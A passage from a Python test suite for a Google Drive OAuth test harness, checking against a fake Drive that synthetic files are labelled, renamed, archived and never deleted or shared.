    assert_clean(ctx.blocked_reason + json.dumps(ctx.target_check, default=str))


def test_a_refused_status_run_saves_a_clean_report(harness, cli, monkeypatch, capsys):
    original = harness.build

    def build_with_a_refusing_drive(ctx):
        ok = original(ctx)
        refuse_paths(ctx, lambda r: r.url.path.startswith("/drive/v3/files/"), google_body(403, "forbidden", "PERMISSION_DENIED"), 403, "forbidden")
        return ok

    monkeypatch.setattr(harness, "build", build_with_a_refusing_drive)
    assert harness.main(["--fake-status", "--out-dir", str(cli)]) == 6
    printed = capsys.readouterr().out
    saved = (cli / "FAKE-status-report.json").read_text(encoding="utf-8")
    assert json.loads(printed)["target"]["google_error"]["http_status"] == 403 and json.loads(saved) == json.loads(printed)
    assert_clean(printed + saved)


# ----------------------------------------------------------------------------------- Phase 2.5 additions: label, visible banner, rename, final archive


def labelled_ctx(harness, tmp_path, label="phase2-5", target="shared-drive"):
    ctx = harness.Context("FAKE", tmp_path)
    ctx.label, ctx.fake_target = label, target
    assert harness.build(ctx) is True, ctx.blocked_reason
    assert harness.apply_write_guard(ctx) is True
    return ctx


def run_steps(harness, ctx):
    results = []
    for number, func in enumerate(harness.TESTS, start=1):
        result = harness.Result(number, func.__name__[4:])
        func(ctx, result)
        results.append(result)
    return results


def test_the_step_order_covers_the_phase_2_5_scope(harness):
    names = [f.__name__[4:] for f in harness.TESTS]
    assert names == [
        "sign_in_and_read_access", "create_run_folder", "upload_pdf", "ownership_and_checksum", "download_sha256_and_range", "rename",
        "duplicate_upload", "archive_and_restore", "token_persistence_and_permissions", "expired_access_token_recovery", "cleanup_archive",
    ]


def test_a_labelled_run_names_everything_as_a_synthetic_phase_artifact(harness, tmp_path):
    ctx = labelled_ctx(harness, tmp_path)
    results = run_steps(harness, ctx)
    assert all(r.status in ("PASS", "PARTIAL") for r in results), {r.name: (r.status, r.detail) for r in results}
    drive = ctx.fake[0]
    assert ctx.run_name.startswith("oauth-spike-phase2-5-")
    created = [f for f in drive.files.values() if f["name"] != "Spinco TA Audit" and f["id"] != ctx.config.root_folder_id]
    files = [f for f in created if f["mimeType"] != "application/vnd.google-apps.folder"]
    assert files and all(f["name"].startswith("PHASE2-5-SYNTHETIC-") for f in files), [f["name"] for f in files]
    assert drive.by_name(ctx.run_name)[0]["appProperties"]["spinco_label"] == "phase2-5"
    assert drive.file_count(include_trashed=True) == 1  # one synthetic file in all: the duplicate upload created no second one


def test_the_labelled_pdf_carries_visible_fictional_text_and_metadata(harness, tmp_path):
    from io import BytesIO

    from pypdf import PdfReader

    ctx = labelled_ctx(harness, tmp_path)
    reader = PdfReader(BytesIO(harness.make_pdf(ctx, "oauth-upload")))
    assert len(reader.pages) == 1
    annotation = reader.pages[0]["/Annots"][0].get_object()
    assert "SYNTHETIC TEST DATA" in annotation["/Contents"] and "FICTIONAL" in annotation["/Contents"] and "NOT A REAL DOCUMENT" in annotation["/Contents"]
    assert "SYNTHETIC TEST DATA" in reader.metadata["/Subject"] and reader.metadata["/Title"] == "synthetic-phase2-5-oauth-upload"


def test_an_unlabelled_run_keeps_the_previous_names_and_blank_pdf(harness, tmp_path):
    ctx = harness.Context("FAKE", tmp_path)
    assert harness.build(ctx) and harness.file_stem(ctx) == "OAUTH-SPIKE"
    from io import BytesIO

    from pypdf import PdfReader

    assert "/Annots" not in PdfReader(BytesIO(harness.make_pdf(ctx, "oauth-upload"))).pages[0]


def test_the_rename_changes_only_the_name_of_the_synthetic_file(harness, tmp_path):
    ctx = labelled_ctx(harness, tmp_path)
    harness.ensure_uploaded(ctx)
    record = ctx.fake[0].files[ctx.uploaded.obj.id]
    before = {k: record[k] for k in ("md5Checksum", "size", "parents", "appProperties")}
    result = harness.Result(6, "rename")
    harness.t06_rename(ctx, result)
    assert result.status == "PASS", result.evidence
    assert record["name"] == "PHASE2-5-SYNTHETIC-renamed.pdf" and {k: record[k] for k in before} == before and record["trashed"] is False
    assert result.evidence["name_before"].endswith("_PHASE2-5-SYNTHETIC-upload.pdf") and result.evidence["content_sha256_intact"] is True  # the storage prefixes names with the content hash
    assert [e["method"] for e in ctx.fake[0].requests if e["method"] == "PATCH"] == ["PATCH"]  # exactly one change request


def test_the_rename_refuses_a_file_that_is_not_in_this_runs_own_folder(harness, tmp_path):
    ctx = labelled_ctx(harness, tmp_path)
    harness.ensure_uploaded(ctx)
    ctx.fake[0].external_move(ctx.uploaded.obj.id, ctx.config.root_folder_id)  # now it sits somewhere else
    patches_before = sum(1 for e in ctx.fake[0].requests if e["method"] == "PATCH")
    result = harness.Result(6, "rename")
    harness.t06_rename(ctx, result)
    assert result.status == "FAIL" and "safely isolated" in result.detail
    assert sum(1 for e in ctx.fake[0].requests if e["method"] == "PATCH") == patches_before  # nothing was changed
    assert ctx.fake[0].files[ctx.uploaded.obj.id]["name"].endswith("_PHASE2-5-SYNTHETIC-upload.pdf")


def test_the_duplicate_is_still_detected_after_the_rename(harness, tmp_path):
    ctx = labelled_ctx(harness, tmp_path)
    for step in (harness.t03_upload_pdf, harness.t06_rename, harness.t07_duplicate_upload):
        result = harness.Result(0, step.__name__)
        step(ctx, result)
        assert result.status == "PASS", (step.__name__, result.evidence)


def test_the_final_cleanup_archives_the_synthetic_file_and_deletes_nothing(harness, tmp_path):
    ctx = labelled_ctx(harness, tmp_path)
    results = run_steps(harness, ctx)
    cleanup = results[-1]
    assert cleanup.name == "cleanup_archive" and cleanup.status == "PASS", cleanup.evidence
    drive = ctx.fake[0]
    record = drive.files[ctx.uploaded.obj.id]
    assert record["parents"] == [ctx.folders.archive(harness.KIND)] and record["trashed"] is False
    assert cleanup.evidence["final_name"] == "PHASE2-5-SYNTHETIC-renamed.pdf"
    assert "DELETE" not in {e["method"] for e in drive.requests}
    assert sum(1 for f in drive.files.values() if f["trashed"]) == 0


def test_a_cleanup_that_leaves_the_file_elsewhere_is_reported_as_a_failure(harness, tmp_path):
    ctx = labelled_ctx(harness, tmp_path)
    harness.ensure_uploaded(ctx)
    real_archive = ctx.storage.archive
    ctx.storage.archive = lambda location, kind: type("Moved", (), {"parents": ("somewhere-else",), "trashed": False})()
    result = harness.Result(11, "cleanup_archive")
    harness.t11_cleanup_archive(ctx, result)
    ctx.storage.archive = real_archive
    assert result.status == "FAIL" and result.evidence["left_in_archive_folder"] is False


def test_the_label_is_validated_and_is_for_write_runs_only(harness, cli):
    for bad in ("Phase 2.5", "UPPER", "x" * 30, "-lead", "with space", ""):
        with pytest.raises(SystemExit):
            harness.main(["--fake", "--run-label", bad, "--out-dir", str(cli)])
    with pytest.raises(SystemExit):
        harness.main(["--status", "--run-label", "phase2-5"])


def test_a_labelled_fake_run_through_the_command_line_reports_every_step(harness, cli):
    assert harness.main(["--fake", "--require-shared-drive", "--run-label", "phase2-5", "--out-dir", str(cli)]) == 0
    report = json.loads((cli / "FAKE-oauth-report.json").read_text(encoding="utf-8"))
    assert report["summary"] == {"PASS": 11} and report["spike_folder"].startswith("oauth-spike-phase2-5-")
    assert [r["name"] for r in report["results"]][5] == "rename" and report["results"][-1]["name"] == "cleanup_archive"
    assert "@" not in (cli / "FAKE-oauth-report.md").read_text(encoding="utf-8")


def test_the_live_harness_source_still_has_no_delete_or_sharing_capability(harness):
    source = (SPIKE_DIR / "run_oauth_live.py").read_text(encoding="utf-8")
    for forbidden in ('"DELETE"', "permanent_delete", "emptyTrash", "create_permission", "permissions.create", "trashed=True"):
        assert forbidden not in source, forbidden
